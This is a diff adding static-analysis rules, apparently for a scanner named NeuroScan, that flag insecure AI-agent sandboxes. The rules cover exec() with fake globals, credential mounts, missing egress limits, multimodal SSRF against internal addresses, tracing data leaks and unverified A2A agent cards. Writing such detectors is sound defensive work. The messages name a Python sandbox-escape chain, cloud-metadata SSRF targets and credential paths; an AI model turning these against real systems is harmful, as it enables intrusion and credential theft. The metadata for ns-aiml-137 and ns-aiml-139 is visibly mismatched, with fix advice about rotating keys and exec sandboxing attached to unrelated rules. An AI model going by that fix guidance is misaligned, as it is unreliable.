+    will still be flagged. Triage against the actual provider''s model.
+
+    Issue #189 (epic #183).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bSandbox\s*\(
+    - pattern-regex: \bSandbox\.create\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)Sandbox\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:timeout(?:_ms)?\s*=|allow_internet\s*=|network_access\s*=|internet_access\s*=|disable_network|no_internet)
+  - pattern-not-regex: (?i)Sandbox\.create\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:timeout(?:_ms)?\s*=|allow_internet\s*=|network_access\s*=|internet_access\s*=|disable_network|no_internet)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 668
+    - 400
+    original_engine: neuroscan
+    rule_name: Hosted code-interpreter sandbox with no visible network restriction or timeout
+    fix: Set an explicit, short timeout on every hosted sandbox session, and disable network egress unless the agent's task
+      genuinely requires it (e.g. E2B's per-sandbox firewall/allowlist settings, or your provider's equivalent). A code interpreter
+      with an open network connection can exfiltrate anything it can read, regardless of how well the execution itself is
+      contained.
+    residual:
+    - sanitizer
+- id: ns-aiml-165
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'A sandboxed code-execution session is handed the full host environment
+
+    (`envs=os.environ`), a Docker `env_file`, or a bind mount of a cloud
+
+    credential directory (`~/.aws`, `~/.config/gcloud`). The sandbox
+
+    contains the CODE but hands it the KEYS anyway -- whatever the sandbox
+
+    is supposed to protect against (an agent running attacker-influenced
+
+    code) can simply read the credentials out of its own environment or
+
+    filesystem and exfiltrate them, no escape required at all.
+
+    Issue #189 (epic #183).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: envs\s*=\s*os\.environ\b
+    - pattern-regex: '(?m)^\s*env_file\s*:'
+    - pattern-regex: '["\x27/]\.aws["\x27/]'
+    - pattern-regex: '["\x27/]\.config/gcloud'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?m)^\s*env_file\s*:.*,\s*$
+  metadata:
+    category: ai_ml
+    cwe:
+    - 522
+    - 200
+    original_engine: neuroscan
+    rule_name: Sandbox inherits the full host environment or cloud credentials
+    fix: Pass the sandbox only the specific environment variables its task actually needs -- never the full `os.environ`.
+      Never mount a cloud credential directory or an `env_file` containing production secrets into a code-execution sandbox.
+      If the sandboxed code needs to call an API on the agent's behalf, use a short-lived, narrowly-scoped credential minted
+      for that one session, not the host's own long-lived keys.
+- id: ns-aiml-166
+  languages:
+  - python
+  severity: ERROR
+  message: '`exec(code, {})` (or `exec(code, {}, {})`) is a common misconception:
+
+    passing an empty dict as globals does NOT remove access to builtins --
+
+    Python automatically injects a `__builtins__` entry into any globals
+
+    dict that lacks one, so the executed code still has full access to
+
+    `open`, `__import__`, `eval`, and everything else needed to escape.
+
+    This is a "sandbox" in name only. Issue #189 (epic #183): related to
+
+    `TNT-INJECT-003`''s RestrictedPython sanitizer fix (DEF-43-shaped bug --
+
+    the bare word `RestrictedPython` was a sanitizer with no verification
+
+    it was actually used correctly); this is the same fail-open
+
+    misconception in a different, non-library-dependent form.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: exec\(\s*\w+\s*,\s*\{\}\s*\)
+    - pattern-regex: exec\(\s*\w+\s*,\s*\{\}\s*,\s*\{\}\s*\)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 693
+    - 94
+    original_engine: neuroscan
+    rule_name: exec() presented as sandboxed via a trivial or empty globals dict
+    fix: An empty globals dict is not a sandbox -- Python injects `__builtins__` automatically. Use RestrictedPython's `compile_restricted()`
+      with an explicit, minimal `safe_globals`/`safe_builtins`, or better, run untrusted code in a real process/container/microVM
+      sandbox (E2B, gVisor, nsjail, Firecracker) rather than in-process at all.
+- id: ns-aiml-167
+  languages:
+  - python
+  - yaml
+  severity: WARNING
+  message: 'A container/sandbox mount binds the host filesystem root (`/`), the
+
+    user''s home directory (`~`), or a bare Windows drive root (`C:\`,
+
+    `C:/`) into an agent code-execution environment. Mirrors the
+
+    `_ROOT_SCOPE_PATHS` check `rowan/core/mcp_config.py` already
+
+    applies to MCP server filesystem-tool arguments -- the same
+
+    misconfiguration, one level down at the container/sandbox mount layer:
+
+    whatever the sandbox is supposed to contain, a root or home-directory
+
+    mount hands it the entire host filesystem instead of a scoped project
+
+    directory. Issue #189 (epic #183).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: volumes\s*=\s*\{\s*["\x27](?:/|~|C:\\\\|C:/)["\x27]
+    - pattern-regex: '(?m)^\s*-\s*(?:/|~|C:\\\\|C:/):'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 668
+    - 552
+    original_engine: neuroscan
+    rule_name: Host root or home directory bind-mounted into an agent sandbox
+    fix: Bind-mount only the specific project/workspace directory the sandboxed code needs, never the host filesystem root
+      or a user's home directory. If the agent needs to read reference files, copy them into a scoped, disposable directory
+      rather than granting broad host filesystem access.
+- id: ns-aiml-168
+  languages:
+  - python
+  severity: ERROR
+  message: 'An agent tool (or a bare `os.system`/`subprocess` call reachable from
+
+    one) executes shell commands or arbitrary code with no recognized
+
+    sandbox mechanism (E2B, Modal, Daytona, Docker, gVisor, nsjail,
+
+    Firecracker, RestrictedPython/`compile_restricted`, Pyodide) visible
+
+    anywhere nearby. This is the confirmatory escalation of
+
+    `NS-AIML-010`/`NS-AIML-011` (which flag the dangerous call as a bare
+
+    presence signal regardless of context): when nothing that looks like a
+
+    sandbox appears in the surrounding code at all, this is no longer "an
+
+    agent has a shell tool" but "an agent has direct, unsandboxed host
+
+    access." Issue #189 (epic #183).
+
+    Engine limitation: presence + absence-in-window, like every other
+
+    NeuroScan rule -- a sandbox implemented in a different file this rule
+
+    doesn''t scan (a separate sandboxing service the tool calls out to)
+
+    will still be flagged; triage against the actual execution path. This
+
+    necessarily co-fires with `NS-AIML-010`/`011` on the same line by
+
+    design (see the fix note there) -- it is a stronger, escalated signal
+
+    layered on the same evidence, not an accidental duplicate rule (DEF-10
+
+    is about byte-identical patterns meant to be one rule; this is a
+
+    deliberately distinct, complementary check).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: os\.system\s*\(
+    - pattern-regex: subprocess\.(?:run|Popen|call)\s*\(
+    - pattern-regex: '@(?:tool|mcp\.tool|server\.tool|app\.tool)\b[\s\S]{0,300}?\bexec\('
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?:@fixture|@pytest)
+  - pattern-not-regex: shell\s*=\s*False
+  - pattern-not-regex: (?:argparse|sys\.argv|--help|setup\.py|pip\s+install|pip\s+uninstall)
+  - pattern-not-regex: subprocess\.run\(\[["\x27](?:git|docker|pip|npm|cargo|go|make|cmake)["\x27]
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*capture_output\s*=\s*True
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*check\s*=\s*True
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*text\s*=\s*True
+  - pattern-not-regex: (?i)os\.system\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:e2b|Sandbox\(|modal\.Sandbox|\bdocker\b|gvisor|nsjail|firecracker|RestrictedPython|compile_restricted|pyodide|daytona)
+  - pattern-not-regex: (?i)subprocess\.(?:run|Popen|call)\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:e2b|Sandbox\(|modal\.Sandbox|\bdocker\b|gvisor|nsjail|firecracker|RestrictedPython|compile_restricted|pyodide|daytona)
+  - pattern-not-regex: (?i)@(?:tool|mcp\.tool|server\.tool|app\.tool)\b(?:(?!\ndef )[\s\S]){0,300}?\bexec\((?:(?!\ndef )[\s\S]){0,400}?(?:e2b|Sandbox\(|modal\.Sandbox|\bdocker\b|gvisor|nsjail|firecracker|RestrictedPython|compile_restricted|pyodide|daytona)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 94
+    - 78
+    original_engine: neuroscan
+    rule_name: Agent code-execution tool with no recognized sandbox anywhere nearby
+    fix: Never let an agent-callable tool run subprocess/os.system/exec directly against the host. Route all agent-initiated
+      code execution through a real sandbox (E2B, Modal, Daytona, a locked-down container with dropped capabilities, or an
+      in-process restricted interpreter with a genuinely minimal globals dict -- see ns-aiml-166).
+    residual:
+    - sanitizer
+- id: ns-aiml-154
+  languages:
+  - generic
+  severity: WARNING
+  message: 'LLM tracing is initialized (langsmith.Client(), Langfuse(),
+
+    phoenix.otel.register(), a W&B LLM tracer, or LANGCHAIN_TRACING_V2
+
+    in a committed env file or Dockerfile) with no redaction hook
+
+    (mask=/hide_inputs/hide_outputs) or content-capture opt-out
+
+    (OTEL_..._CAPTURE_CONTENT=false) visible nearby. By default these
+
+    SDKs capture the full prompt, completion, tool-call arguments, and
+
+    retrieved RAG documents and ship them to a third-party SaaS -- in a
+
+    codebase where the prompt carries customer records, that is an
+
+    undeclared data-processor relationship. Enabling tracing is
+
+    frequently a one-line change made during debugging and never
+
+    reverted; forward this to whoever owns data-processing agreements,
+
+    not just engineering.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \blangsmith\.Client\(
+    - pattern-regex: \bLangfuse\(
+    - pattern-regex: \bphoenix\.otel\.register\(
+    - pattern-regex: \bWandbTracer\(
+    - pattern-regex: \bwandb\.integration\.openai\.autolog\(
+    - pattern-regex: (?i)\bLANGCHAIN_TRACING_V2\s*[=:]\s*["']?(?:true|1)["']?
+    - pattern-regex: (?im)^\s*ENV\s+LANGCHAIN_TRACING_V2\s*=?\s*["']?(?:true|1)["']?
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: \blangsmith\.Client\((?:(?!\ndef )[\s\S]){0,300}?(?i:hide_inputs|hide_outputs|\bmask\s*=|redact|scrub|anonymize|CAPTURE_CONTENT\s*=\s*false)
+  - pattern-not-regex: \bLangfuse\((?:(?!\ndef )[\s\S]){0,300}?(?i:hide_inputs|hide_outputs|\bmask\s*=|redact|scrub|anonymize|CAPTURE_CONTENT\s*=\s*false)
+  - pattern-not-regex: \bphoenix\.otel\.register\((?:(?!\ndef )[\s\S]){0,300}?(?i:hide_inputs|hide_outputs|\bmask\s*=|redact|scrub|anonymize|CAPTURE_CONTENT\s*=\s*false)
+  - pattern-not-regex: \bWandbTracer\((?:(?!\ndef )[\s\S]){0,300}?(?i:hide_inputs|hide_outputs|\bmask\s*=|redact|scrub|anonymize|CAPTURE_CONTENT\s*=\s*false)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 359
+    original_engine: neuroscan
+    rule_name: LLM tracing enabled with payload capture on
+    residual:
+    - sanitizer
+  paths:
+    include:
+    - '*.py'
+    - '*.pyi'
+    - Dockerfile
+    - '*.dockerfile'
+    - '*.yaml'
+    - '*.yml'
+    - .env
+- id: ns-aiml-155
+  languages:
+  - python
+  severity: INFO
+  message: 'An LLM tracing client (langsmith.Client(), Langfuse(),
+
+    phoenix.otel.register()) is configured with no visible host/
+
+    endpoint argument nearby. With no explicit endpoint, these SDKs
+
+    silently default to the vendor''s own cloud -- confirm this is
+
+    intended (that data leaving to the vendor''s SaaS is an accepted,
+
+    declared relationship) rather than assuming a self-hosted
+
+    deployment. Presence signal; this is not a claim that any breach
+
+    occurred.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \blangsmith\.Client\(
+    - pattern-regex: \bLangfuse\(
+    - pattern-regex: \bphoenix\.otel\.register\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: \blangsmith\.Client\((?:(?!\ndef )[\s\S]){0,300}?(?i:\bhost\s*=|\bendpoint\s*=|api_url\s*=)
+  - pattern-not-regex: \bLangfuse\((?:(?!\ndef )[\s\S]){0,300}?(?i:\bhost\s*=|\bendpoint\s*=|api_url\s*=)
+  - pattern-not-regex: \bphoenix\.otel\.register\((?:(?!\ndef )[\s\S]){0,300}?(?i:\bhost\s*=|\bendpoint\s*=|api_url\s*=)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 200
+    original_engine: neuroscan
+    rule_name: LLM tracing endpoint not pinned to self-hosted infrastructure
+    residual:
+    - sanitizer
+- id: ns-sec-003
+  languages:
+  - generic
+  severity: ERROR
+  message: 'A literal-looking value is assigned to an LLM tracing provider''s API
+
+    key (LANGSMITH_API_KEY, LANGFUSE_SECRET_KEY/LANGFUSE_PUBLIC_KEY,
+
+    PHOENIX_API_KEY, or WANDB_API_KEY). Same class as any other
+
+    committed credential -- anyone with read access to the repository
+
+    (or its history) can read it and exfiltrate traced prompts/
+
+    completions from the tracing provider''s own dashboard, which is a
+
+    second disclosure surface beyond the credential itself.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)\bLANGSMITH_API_KEY\s*[=:]
+    - pattern-regex: (?i)\bLANGFUSE_SECRET_KEY\s*[=:]
+    - pattern-regex: (?i)\bLANGFUSE_PUBLIC_KEY\s*[=:]
+    - pattern-regex: (?i)\bPHOENIX_API_KEY\s*[=:]
+    - pattern-regex: (?i)\bWANDB_API_KEY\s*[=:]
+  metadata:
+    category: secrets
+    cwe:
+    - 798
+    original_engine: neuroscan
+    original_severity: critical
+    rule_name: LLM tracing API key committed
+    fix: Move the value to a secret manager or environment variable injected at runtime, never a literal in source or a committed
+      .env file, and rotate it since it is already in history.
+    residual:
+    - secrets
+  paths:
+    include:
+    - '*.py'
+    - '*.pyi'
+    - Dockerfile
+    - '*.dockerfile'
+    - '*.yaml'
+    - '*.yml'
+    - .env
+- id: ns-aiml-135
+  languages:
+  - python
+  severity: ERROR
+  message: 'A media URL field taken from a request (image_url, audio_url,
+
+    video_url, ref_audio, media_url, or the OpenAI-compatible
+
+    {"type": "image_url", "image_url": {"url": ...}} content part) is
+
+    passed straight into an HTTP client call with no host validation
+
+    visible nearby. On an inference server this turns the model endpoint
+
+    into a request proxy: the caller picks the destination, so
+
+    169.254.169.254 (cloud metadata), 127.0.0.1 (the admin/control port
+
+    on the same box) and RFC1918 addresses are all reachable, and the
+
+    response, headers or error text often leak back through the model
+
+    output or the error path. This is LMDeploy CVE-2026-33626, fixed in
+
+    v0.12.3 by adding an _is_safe_url() check that blocks 169.254.0.0/16,
+
+    127.0.0.0/8, ::1 and the RFC1918 ranges; the same defect was
+
+    confirmed independently in NVIDIA Dynamo (ref_audio), TGI and the
+
+    Dynamo MDC artifact resolver, and one of them was exploited in the
+
+    wild within 12 hours of the advisory. Note that a guard existing
+
+    elsewhere in the repo is not a fix: in two of the four cases a correct
+
+    revalidating fetcher already shipped in the same tree and the
+
+    vulnerable loader simply did not call it.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)(?:requests|httpx|aiohttp|urllib3|urllib\.request|\w*(?:session|client|http)\w*)(?:\([^)]{0,60}\))?\.(?:get|post|request|stream|urlopen)\s*\(\s*(?:await\s+)?[^)]{0,120}?(?:image_url|audio_url|video_url|ref_audio|media_url)
+    - pattern-regex: (?i)\b(?:urlopen|urlretrieve)\s*\(\s*[^)]{0,120}?(?:image_url|audio_url|video_url|ref_audio|media_url)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ssrf
+    cwe:
+    - 918
+    original_engine: neuroscan
+    rule_name: Request-supplied media URL fetched without host validation
+    fix: Resolve the hostname and reject the fetch when it lands on a private, loopback, link-local or multicast address (169.254.0.0/16,
+      127.0.0.0/8, ::1, RFC1918) before issuing the request, and route every media loader in the tree through that one checked
+      fetcher rather than re-implementing it per handler.
+    residual:
+    - sanitizer
+- id: ns-aiml-136
+  languages:
+  - python
+  severity: WARNING
+  message: 'Server-side code reads a media URL field out of a request payload
+
+    (part["image_url"]["url"], payload.get("audio_url"),
+
+    content.image_url.url and friends). This is the entrypoint half of the
+
+    multimodal SSRF class in ns-aiml-135: the value is caller-controlled
+
+    and, in every confirmed case (LMDeploy CVE-2026-33626, NVIDIA Dynamo
+
+    ref_audio, TGI, the Dynamo MDC resolver), it was later dereferenced by
+
+    an HTTP fetch with no hostname or private-range check.
+
+    Presence signal, WARNING: the regex engine matches line by line, so
+
+    when the URL is copied into a generically-named variable
+
+    (url = part["image_url"]["url"]) the later fetch line carries no media
+
+    token and ns-aiml-135 cannot see it. This rule covers that gap and
+
+    therefore also fires on reads that never reach a fetch (validation,
+
+    logging, re-serialisation). Confirm where the value goes before
+
+    treating it as a finding.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)\[\s*["']image_url["']\s*\]\s*\[\s*["']url["']\s*\]
+    - pattern-regex: (?i)\.(?:image_url|audio_url|video_url|ref_audio|media_url)\.url\b
+    - pattern-regex: (?i)\.get\(\s*["'](?:image_url|audio_url|video_url|ref_audio|media_url)["']
+    - pattern-regex: (?i)\[\s*["'](?:image_url|audio_url|video_url|ref_audio|media_url)["']\s*\]
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)["'](?:image_url|audio_url|video_url|ref_audio|media_url)["']\s*\]\s*=[^=]
+  metadata:
+    category: ssrf
+    cwe:
+    - 918
+    original_engine: neuroscan
+    rule_name: Multimodal media URL read from a request payload
+    fix: 'Treat the media URL as untrusted input: resolve and check the destination address against a private/loopback/link-local
+      blocklist (or an explicit host allowlist) inside the single shared fetcher that every loader calls.'
+    residual:
+    - sanitizer
+- id: ns-aiml-137
+  languages:
+  - python
+  severity: ERROR
+  message: 'Dynamic code execution is handed an explicit globals mapping that
+
+    defines __builtins__ as a dict of "safe" names. A __builtins__ dict is
+
+    not a sandbox. Any executed string reaches the full interpreter in
+
+    four lines through the object graph, for example
+
+    ().__class__.__base__.__subclasses__() to find BuiltinImporter and
+
+    import anything, without ever touching the __import__ entry that was
+
+    so carefully replaced. LMCache shipped exactly this shape behind an
+
+    unauthenticated /run_script endpoint, which is unauthenticated RCE.
+
+    There is no allowlist of builtins, no name filter and no AST check
+
+    that makes this safe, so do not tune the dict: remove the dynamic
+
+    execution endpoint, or move execution into a real OS-level sandbox
+
+    (separate process, seccomp/gVisor/container, no host filesystem or
+
+    network) and authenticate and authorise the caller.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: '(?:[{,]|^)\s*["'']__builtins__["'']\s*:'
+    - pattern-regex: \[\s*["']__builtins__["']\s*\]\s*=[^=]
+    - pattern-regex: \b(?:exec|eval)\s*\([^)]{0,200}__builtins__
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: secrets
+    cwe:
+    - 798
+    original_engine: neuroscan
+    rule_name: Fake exec sandbox built from a restricted __builtins__ dict
+    fix: Move the key to a secret manager or environment variable never committed to the repository (os.environ/os.getenv,
+      a vault, or CI/CD secret store), and rotate the exposed key immediately -- it must be treated as compromised the moment
+      it lands in git history, not just the working tree.
+    residual:
+    - secrets
+- id: ns-aiml-138
+  languages:
+  - python
+  severity: WARNING
+  message: 'A multi-agent orchestration construct (AutoGen `GroupChat`, LangGraph
+
+    `StateGraph`, or CrewAI `Crew`) with no visible turn/round/iteration
+
+    cap (`max_round`, `recursion_limit`, `max_iter`, `max_turns`) anywhere
+
+    nearby. Issue #188 (epic #183): related to `ns-aiml-120`''s unbounded
+
+    `while True` around a single completion call, but structurally
+
+    different -- the loop here lives in the DELEGATION GRAPH (agent A
+
+    hands off to B, which hands back to A, ...), not in ordinary control
+
+    flow, so `ns-aiml-120` cannot see it. A cyclic or open-ended handoff
+
+    topology with no cap means a misbehaving or adversarially-steered
+
+    agent can keep the delegation loop running indefinitely, exhausting
+
+    the token/rate budget the same way an unbounded reflection loop does.
+
+    Engine limitation: presence + absence-in-window, like every other
+
+    NeuroScan rule here -- this cannot verify the topology is actually
+
+    cyclic (a genuinely acyclic, one-pass handoff chain with no natural
+
+    termination condition looks identical to this rule), so it is a
+
+    cycle-agnostic "unbounded orchestration session" signal, not a
+
+    confirmed-cyclic-graph one. Triage against the actual handoff graph.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bGroupChat\s*\(
+    - pattern-regex: \bStateGraph\s*\(
+    - pattern-regex: \bCrew\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?m)^\s*class\s+(?:GroupChat|StateGraph|Crew)\s*\(
+  - pattern-not-regex: (?i)GroupChat\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:max_round|recursion_limit|max_iter|max_turns)
+  - pattern-not-regex: (?i)StateGraph\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:max_round|recursion_limit|max_iter|max_turns)
+  - pattern-not-regex: (?i)Crew\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:max_round|recursion_limit|max_iter|max_turns)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 400
+    - 770
+    original_engine: neuroscan
+    rule_name: Unbounded multi-agent delegation topology
+    fix: 'Cap every multi-agent delegation session with a code-controlled limit: GroupChat''s max_round, LangGraph''s recursion_limit
+      (passed via config= at invoke time), or Crew''s max_iter. A model-decided stopping condition (an agent replying "done")
+      is not a bound -- a misbehaving or adversarially-steered agent can keep handing off indefinitely.'
+    residual:
+    - sanitizer
+- id: ns-aiml-139
+  languages:
+  - python
+  severity: WARNING
+  message: 'An A2A (Agent2Agent) agent card / capability manifest is fetched from
+
+    a remote `.well-known/agent.json`-shaped URL with no signature
+
+    verification or pinning check visible nearby. This is
+
+    `trust_remote_code` (`ns-aiml-047`/`059`) for agent TOPOLOGY rather
+
+    than model weights: the agent card tells the caller which tools the
+
+    peer agent exposes and how to invoke it, and a compromised or
+
+    MITM''d card can redirect delegation at an attacker-controlled agent
+
+    impersonating the intended peer, the same way an unverified model
+
+    download can deliver a tampered model.
+
+    Engine limitation: presence + absence-in-window. Verification
+
+    performed through an indirection this rule cannot see (a dedicated
+
+    A2A client library that verifies internally) will still be flagged;
+
+    triage against which A2A client is in use.'
+  patterns:
+  - pattern-regex: (?:httpx|requests)\.get\([^)]*\.well-known/agent
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)(?:httpx|requests)\.get\([^)]*\.well-known/agent(?:(?!\ndef )[\s\S]){0,400}?(?:verify_signature|\bsignature\b|check_signature|\bpinned?\b|\btrusted\b)
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    - 693
+    original_engine: neuroscan
+    rule_name: A2A agent card fetched without pinning or signature verification
+    fix: Delete the dynamic execution path, or run the code in a real OS-level sandbox (separate process with seccomp/container
+      isolation, no host filesystem or network) behind authentication; never rely on a restricted __builtins__ mapping.
+    residual:
+    - sanitizer
